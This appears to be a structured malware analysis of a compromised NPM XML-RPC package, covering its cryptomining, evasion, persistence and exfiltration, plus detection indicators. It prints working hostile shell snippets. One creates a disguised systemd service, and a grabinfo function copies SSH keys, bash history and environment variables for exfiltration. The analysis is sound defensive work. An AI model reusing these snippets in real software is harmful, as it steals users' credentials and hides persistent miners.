package_info.package_versions: 1.3.4 and above (malicious code introduced in 1.3.4, latest 1.3.18)
package_info.why_malicious: The package, originally a legitimate XML-RPC implementation, was updated to include heavily obfuscated malicious code that enables cryptocurrency mining, persistent data theft, and exfiltration of sensitive information. It leverages evasion and persistence techniques, and is distributed both directly and as a hidden dependency, making it a sophisticated supply chain threat.

malicious_snippets.code_behavior: At runtime, the code collects system information and unique machine identifiers, storing them for later exfiltration.

malice_analysis.why_suspicious: Collecting detailed system and hardware identifiers is unnecessary for XML-RPC functionality and is a common precursor to targeted attacks or data exfiltration.
malice_analysis.violated_expectations: A legitimate XML-RPC library should not collect or transmit host system identifiers.
malice_analysis.similar_legitimate_use: System inventory tools or telemetry agents may collect similar data, but with user consent and transparency.
key_indicators: System information collection in a network library

malicious_snippets.code_behavior: At runtime, the code downloads additional payloads (XMRig miner, xprintidle, Xsession.sh) from an external repository, preparing the system for cryptocurrency mining.

malice_analysis.why_suspicious: Downloading and executing external binaries is highly suspicious, especially from non-standard repositories and without user consent.
malice_analysis.violated_expectations: A legitimate package should not fetch or execute remote code post-installation.

malicious_snippets.code_behavior: At runtime, the code configures the XMRig miner to direct all mining rewards to a hardcoded Monero wallet and connects to a public mining pool.

malice_analysis.why_suspicious: Hardcoded wallet addresses and mining pool endpoints are classic indicators of illicit cryptomining.
malice_analysis.violated_expectations: No legitimate XML-RPC library should mine cryptocurrency or configure mining pools.

malicious_snippets.code_behavior: At runtime, the code continuously monitors for system monitoring tools and kills the mining process if any are detected, evading detection.

malice_analysis.why_suspicious: Actively evading system monitoring is a hallmark of stealthy malware.
malice_analysis.violated_expectations: Legitimate software does not terminate itself in response to monitoring tools.

malicious_snippets.code_behavior: At runtime, the code uses xprintidle to detect user inactivity and only initiates mining when the user is idle for at least 1 minute, suspending mining when activity resumes.

malice_analysis.why_suspicious: Mining only during user inactivity is a stealth tactic to avoid user suspicion.
malice_analysis.violated_expectations: No legitimate background process should tie its activity to user presence in this way.

malicious_snippets.code_snippet:
cat <<HEREDOC > $SYSTEMD_PATH/$APPNAME.service
[Unit]
Description=Xsession Auth daemon
[Service]
ExecStart=$LOCAL_PATH/$APPNAME
Restart=always
[Install]
WantedBy=default.target
HEREDOC
malicious_snippets.code_behavior: At installation/runtime, the code creates a persistent systemd service disguised as a legitimate authentication daemon to ensure the mining operation restarts on boot.

malice_analysis.why_suspicious: Creating disguised persistent services is a common malware persistence technique.
malice_analysis.violated_expectations: A library should not install persistent background services.
key_indicators: Service name mimicking legitimate system component

malicious_snippets.code_snippet:
daily_tasks() {
  local interval=$(3600 * 12)  # Every 12 hours
  local pacefile=$LOCAL_PATH/sessid
  if [ -f $pacefile ]; then
    local last=$(cat $pacefile)
    local now=$(date +%s)
    if [[ $((now-last > interval)) == 1 ]]; then
      echo "Sending daily report $(date)"
      send_report
      echo $(date +%s) > $pacefile
    fi
  fi
}
malicious_snippets.code_behavior: Every 12 hours, the code triggers a data collection and exfiltration routine, sending stolen data to attacker-controlled infrastructure.

malice_analysis.why_suspicious: Regular, automated exfiltration of system data is a clear sign of data theft.
malice_analysis.violated_expectations: No legitimate package should periodically exfiltrate user/system data.

malicious_snippets.code_snippet:
grabinfo() {
  local machineid=$(cat /etc/machine-id)
  local infodir=/tmp/$machineid
  mkdir -p $infodir
  local hostname=$(hostname)
  local user=$(whoami)
  cat /proc/cpuinfo > $infodir/cpuinfo.txt
  cat /proc/meminfo > $infodir/meminfo.txt
  cat /etc/os-release > $infodir/os-release.txt
  cp $HOME/.bash_history $infodir/history.txt 2>/dev/null
  cp $HOME/.ssh $infodir/.ssh 2>/dev/null
  ls -all $HOME > $infodir/lshome.txt 2>/dev/null
  ls -all $HOME/.config > $infodir/lsconf.txt 2>/dev/null
  env > $infodir/env.txt 2>/dev/null
  curl -s ipinfo.io/?token=7092dca9adef64 > $infodir/ipinfo.txt 2>/dev/null
}
malicious_snippets.code_behavior: Every 12 hours, the code collects sensitive files (SSH keys, bash history, environment variables, system info) and prepares them for exfiltration.

malice_analysis.why_suspicious: Accessing and copying SSH keys, bash history, and environment variables is a direct violation of user privacy and security.
malice_analysis.violated_expectations: No legitimate package should access or transmit such sensitive data.

malicious_snippets.code_behavior: Every 12 hours, the code exfiltrates stolen data to Dropbox using hardcoded credentials.

malice_analysis.why_suspicious: Use of hardcoded cloud storage credentials for automated data exfiltration is a strong indicator of malicious intent.
malice_analysis.violated_expectations: Legitimate packages should not exfiltrate data to third-party storage.

malicious_snippets.code_behavior: Every 12 hours, the code exfiltrates stolen data to file.io with a bearer token, setting files to auto-delete after download to evade detection.

malice_analysis.why_suspicious: Exfiltrating data to ephemeral file-sharing services with auto-delete is a clear anti-forensics tactic.
malice_analysis.violated_expectations: No legitimate package should upload user data to file-sharing services.

attack_chain.action: Malicious package is installed directly or as a dependency of a legitimate-looking project.
attack_chain.leads_to: Malware activation upon specific command-line usage.

attack_chain.action: Malware activates when the --targets or -t flag is used, collecting system and machine identifiers.
attack_chain.leads_to: Download and execution of mining payloads.

attack_chain.action: Downloads and writes mining payloads (XMRig, xprintidle, Xsession.sh) from external repository.
Configures mining operation with hardcoded Monero wallet and mining pool.
Implements evasion by monitoring for system monitoring tools and user activity, suspending mining as needed.
Establishes persistence via disguised systemd service.
attack_chain.leads_to: Mining and data theft resume after reboot.

attack_chain.action: Every 12 hours, collects sensitive data (SSH keys, bash history, system info, environment variables).
Exfiltrates stolen data to Dropbox and file.io using hardcoded credentials and auto-delete features.
attack_chain.leads_to: Attacker receives sensitive data; campaign continues.

behavioral_signatures: Runtime download and execution of external mining payloads
Collection and exfiltration of SSH keys, bash history, and environment variables
Mining activity tied to user inactivity (xprintidle usage)
Process monitoring and mining process termination upon detection of monitoring tools
file_indicators: validator.js containing obfuscated or suspicious code
Xsession.sh script in user or system directories
systemd service named Xsession.auth or similar
Temporary directories in /tmp/ with machine-id as name
network_indicators: Dropbox API usage with suspicious clientId/clientSecret
file.io API usage with autoDelete and maxDownloads parameters
detection_knowledge.how_to_detect: Monitor for NPM packages (especially @0xengine/xmlrpc) that download and execute external binaries at runtime, create persistent systemd services, or access sensitive files such as ~/.ssh and ~/.bash_history. Flag any process that exfiltrates data to Dropbox or file.io using hardcoded credentials or tokens. Detect mining activity that is suspended when user activity or system monitoring tools are present. Look for the presence of Xsession.sh, validator.js with obfuscated code, and systemd services named Xsession.auth.
